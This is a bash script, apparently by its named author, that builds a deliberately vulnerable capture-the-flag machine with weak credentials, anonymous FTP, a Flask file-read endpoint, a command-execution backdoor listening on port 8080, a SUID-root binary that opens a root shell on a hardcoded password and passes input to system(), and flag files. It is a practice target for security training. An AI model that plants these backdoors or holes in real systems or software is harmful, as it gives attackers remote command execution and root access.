#!/bin/bash
# ===========================================
# TailChase VM v2.0 - FIXED AUTO SETUP
# Run on the VM as root
# ===========================================

set -e

echo "[+] ===== TailChase VM Setup ====="
echo "[+] Author: Ankit Patidar"

export DEBIAN_FRONTEND=noninteractive

# Fix hosts
echo "tailchase" > /etc/hostname
cat > /etc/hosts << 'EOF'
127.0.0.1 localhost
127.0.1.1 tailchase
::1 localhost ip6-localhost ip6-loopback
EOF

# Install packages (skip proftpd - not in Debian 12)
apt-get install -y -qq vsftpd nginx python3 python3-pip python3-venv \
  openssh-server samba smbclient sudo curl wget sqlite3 netcat-openbsd \
  build-essential steghide imagemagick binutils psmisc net-tools \
  rsyslog dnsutils cron openssl passwd whois 2>&1 | tail -3

echo "[+] Packages installed"

# Create unique users
useradd -m -s /bin/bash devops 2>/dev/null || true
echo "devops:devops@2024" | chpasswd
useradd -m -s /bin/bash secops 2>/dev/null || true
echo "secops:SecOps#123!" | chpasswd
useradd -m -s /bin/bash sarah 2>/dev/null || true
echo "sarah:Sarah@TailChase!" | chpasswd
useradd -M -s /usr/sbin/nologin guest 2>/dev/null || true
echo "[+] Users: devops, secops, sarah"

# --- FTP ---
mkdir -p /srv/ftp/{incoming,.hidden,backups}
cat > /etc/vsftpd.conf << 'FTPEOF'
listen=YES
anonymous_enable=YES
anon_root=/srv/ftp
anon_upload_enable=YES
anon_mkdir_write_enable=YES
dirmessage_enable=YES
hide_ids=YES
local_enable=YES
chroot_local_user=YES
no_anon_password=YES
anon_umask=022
FTPEOF

cat > /srv/ftp/readme.txt << 'EOF'
TAILCHASE SOFTWARE SOLUTIONS - INTERNAL MEMO
Former employee DevOps terminated - may have left backdoors.
If you find anything suspicious, report to security.
EOF

cat > /srv/ftp/.devops_note.txt << 'EOF'
I've left evidence scattered across the system.
Good luck catching me. ;) - DevOps
EOF

echo "ZGV2b3BzOmlsb3ZlY2F0cyEhISE=" > /srv/ftp/backups/.config.b64
chown -R nobody:nogroup /srv/ftp/ && chmod -R 755 /srv/ftp/
chmod 777 /srv/ftp/incoming
systemctl enable vsftpd 2>/dev/null && systemctl restart vsftpd 2>/dev/null || true
echo "[+] FTP configured"

# --- SMB ---
cat > /etc/samba/smb.conf << 'SMBEOF'
[global]
workgroup = TAILCHASE
server string = TailChase Server
security = user
map to guest = bad user
guest account = guest

[SharedDocs]
path = /srv/smb/shared
browsable = yes
guest ok = yes
read only = yes

[DevOpsBackup]
path = /srv/smb/devops_backup
browsable = no
valid users = devops

[IT_Stuff]
path = /srv/smb/it_stuff
browsable = yes
guest ok = yes
read only = yes
SMBEOF

mkdir -p /srv/smb/{shared,devops_backup,it_stuff}
cat > /srv/smb/shared/company_handbook.txt << 'EOF'
TailChase Employees: devops (TERMINATED), secops, sarah
EOF
cat > /srv/smb/it_stuff/audit_report.txt << 'EOF'
Security finding: DevOps SSH key encrypted with weak passphrase.
EOF
echo "devops@123" | smbpasswd -a devops -s 2>/dev/null || true
chown -R nobody:nogroup /srv/smb/shared /srv/smb/it_stuff 2>/dev/null
chown -R devops:devops /srv/smb/devops_backup 2>/dev/null
systemctl enable smbd 2>/dev/null && systemctl restart smbd 2>/dev/null || true
echo "[+] SMB configured"

# --- nginx website ---
mkdir -p /var/www/html/{css,js,images,blog,team,services}
cat > /var/www/html/index.html << 'HTML'
<!DOCTYPE html>
<html><head><title>TailChase Software</title>
<style>body{font-family:sans-serif;background:#1a1a2e;color:#eee;padding:20px;}
h1{color:#e94560;}.tagline{color:#888;font-style:italic;}
a{color:#e94560;}
</style></head><body>
<h1>TailChase Software Solutions</h1>
<div class="tagline">"Even a blind cat catches a mouse sometimes."</div>
<p>Welcome to our corporate site.</p>
<!-- TODO: Remove debug endpoints -->
<hr><a href="/portal/">Client Portal</a> | <a href="/team/">Team</a>
</body></html>
HTML

cat > /etc/nginx/sites-available/default << 'NGINX'
server {
    listen 80 default_server;
    root /var/www/html;
    index index.html;
    location / { try_files $uri $uri/ =404; }
    location /portal/ { proxy_pass http://127.0.0.1:5000/; }
    location /console { proxy_pass http://127.0.0.1:5000/console; }
}
NGINX
rm -f /etc/nginx/sites-enabled/default
ln -sf /etc/nginx/sites-available/default /etc/nginx/sites-enabled/
systemctl enable nginx 2>/dev/null && systemctl restart nginx 2>/dev/null || true
echo "[+] Website configured"

# --- Portal Flask App ---
mkdir -p /opt/portal_api
cat > /opt/portal_api/app.py << 'FLASK'
import os,sqlite3
from flask import Flask,request,jsonify,session
app=Flask(__name__)
app.config['SECRET_KEY']='tailchase_dev_key_2024'
app.config['DEBUG']=True
DB='/opt/portal_api/portal.db'

def init_db():
    os.makedirs(os.path.dirname(DB),exist_ok=True)
    conn=sqlite3.connect(DB)
    conn.execute("CREATE TABLE IF NOT EXISTS config(key TEXT PRIMARY KEY,value TEXT)")
    conn.execute("INSERT OR IGNORE INTO config VALUES('debug_mode','true')")
    conn.commit(); conn.close()
init_db()

@app.route('/portal/api/status')
def status():
    d=request.args.get('debug','0')
    if d=='1': return jsonify({'version':'2.1','mode':'debug'})
    return jsonify({'version':'2.1','status':'running'})

@app.route('/portal/api/file')
def read_file():
    p=request.args.get('path','')
    if not p: return jsonify({'error':'no path'}),400
    try:
        with open(p)as f: return jsonify({'content':f.read(4096)})
    except Exception as e: return jsonify({'error':str(e)}),500

@app.route('/console')
def console(): return 'Werkzeug Console - PIN protected'

@app.route('/portal/')
def portal_index(): return '<html><head><title>Login</title></head><body><h1>Client Portal</h1><form>User:<input><br>Pass:<input><br><button>Login</button></form><!-- creds: devops/devops@2024 --></body></html>'

if __name__=='__main__': app.run(host='127.0.0.1',port=5000,debug=True)
FLASK

cat > /etc/systemd/system/portal.service << 'SVC'
[Unit]Description=TailChase Portal\nAfter=network.target\n[Service]\nType=simple\nUser=www-data\nExecStart=/usr/bin/python3 /opt/portal_api/app.py\nRestart=always\n[Install]\nWantedBy=multi-user.target
SVC

# --- DevOps Backdoor Port 8080 ---
mkdir -p /opt/devops_service
cat > /opt/devops_service/logger.py << 'PYEOF'
import socket,os
s=socket.socket()
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind(('0.0.0.0',8080))
s.listen(5)
while 1:
    c,a=s.accept()
    c.send(b"EXEC|<cmd>\n")
    d=c.recv(4096).decode().strip()
    if d.startswith('EXEC|'):
        r=os.popen(d.split('|',1)[1]+' 2>&1').read()
        c.send(r.encode())
    c.close()
PYEOF

cat > /etc/systemd/system/devops.service << 'SVC2'
[Unit]Description=DevOps Service\nAfter=network.target\n[Service]\nType=simple\nUser=devops\nExecStart=/usr/bin/python3 /opt/devops_service/logger.py\nRestart=always\n[Install]\nWantedBy=multi-user.target
SVC2

# --- SSH Key ---
mkdir -p /home/devops/.ssh
ssh-keygen -t rsa -b 2048 -f /tmp/devops_key -N 'cat123' -q 2>/dev/null
cp /tmp/devops_key /home/devops/.ssh/id_rsa
cp /tmp/devops_key.pub /home/devops/.ssh/authorized_keys
chown -R devops:devops /home/devops/.ssh
chmod 700 /home/devops/.ssh && chmod 600 /home/devops/.ssh/id_rsa
rm -f /tmp/devops_key /tmp/devops_key.pub

# Store key in DB
python3 -c "
import sqlite3,base64
conn=sqlite3.connect('/opt/portal_api/portal.db')
with open('/home/devops/.ssh/id_rsa','rb')as f:
    conn.execute('INSERT OR REPLACE INTO config VALUES(?,?)',('devops_ssh_key',base64.b64encode(f.read()).decode()))
conn.commit(); conn.close()
"
echo "[+] SSH & Portal configured"

# --- SUID Binary ---
cat > /tmp/agent.c << 'CEOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
int main(int a,char*v[]){
    setuid(0);setgid(0);
    if(a>=3&&!strcmp(v[1],"--override")&&!strcmp(v[2],"DevOpsRocks!"))
        execl("/bin/bash","bash",NULL);
    char i[256];
    printf("DevOps Agent> ");fflush(stdout);
    if(!fgets(i,256,stdin))return 1;
    i[strcspn(i,"\n")]=0;
    if(strncmp(i,"ping ",5)==0){char c[512];snprintf(c,512,"ping -c 1 %s",i+5);system(c);}
    else if(strncmp(i,"read ",5)==0){sleep(2);FILE*f=fopen(i+5,"r");if(f){char b[1024];while(fgets(b,1024,f))printf("%s",b);fclose(f);}}
    else printf("Unknown\n");
    return 0;
}
CEOF
gcc -o /tmp/agent /tmp/agent.c -static 2>/dev/null || gcc -o /tmp/agent /tmp/agent.c
cp /tmp/agent /usr/local/bin/.devops_agent
chown root:devops /usr/local/bin/.devops_agent
chmod 4550 /usr/local/bin/.devops_agent
rm -f /tmp/agent.c /tmp/agent
echo "[+] SUID binary installed"

# --- Flags ---
echo "TAILCHASE{wh0_1s_th3_c4t_wh0_1s_th3_m0us3}" > /home/devops/user.txt
chown devops:devops /home/devops/user.txt && chmod 644 /home/devops/user.txt
echo "TAILCHASE{t@1lch4s3_m4st3r_0f_d1sgu1s3}" > /root/root.txt
chmod 600 /root/root.txt
mkdir -p /opt/.secrets
echo "TAILCHASE{d3v0ps_w4s_h3r3}" > /opt/.secrets/.bonus_flag.txt
chmod 644 /opt/.secrets/.bonus_flag.txt
echo "[+] Flags created"

# --- DevOps notes ---
cat > /home/devops/notes.txt << 'EOF'
Check /usr/local/bin for surprises. Passphrase hint: cat123
- DevOps
EOF
chown devops:devops /home/devops/notes.txt

# --- Firewall ---
apt-get install -y -qq iptables-persistent 2>/dev/null || true
iptables -F
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -i lo -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 21 -j ACCEPT
iptables -A INPUT -p tcp --dport 139,445 -j ACCEPT
iptables -A INPUT -p tcp --dport 8080 -j ACCEPT
iptables -A INPUT -p icmp -j ACCEPT
mkdir -p /etc/iptables
iptables-save > /etc/iptables/rules.v4 2>/dev/null || true
echo "[+] Firewall configured"

# --- Enable services ---
systemctl daemon-reload 2>/dev/null
systemctl enable ssh nginx portal devops vsftpd smbd 2>/dev/null || true
systemctl restart ssh nginx portal devops vsftpd smbd 2>/dev/null || true

# --- Cleanup ---
rm -f /tmp/setup_vuln.sh
> /root/.bash_history 2>/dev/null || true

echo ""
echo "=========================================="
echo "  TAILCHASE VM v2.0 - SETUP COMPLETE!"
echo "  Author: Ankit Patidar"
echo "=========================================="
echo ""
echo "  SERVICES: FTP(21) SSH(22) HTTP(80)"
echo "           SMB(139/445) Custom(8080)"
echo ""
echo "  USERS: devops, secops, sarah"
echo ""
echo "  FLAGS: /home/devops/user.txt"
echo "         /root/root.txt"
echo "=========================================="
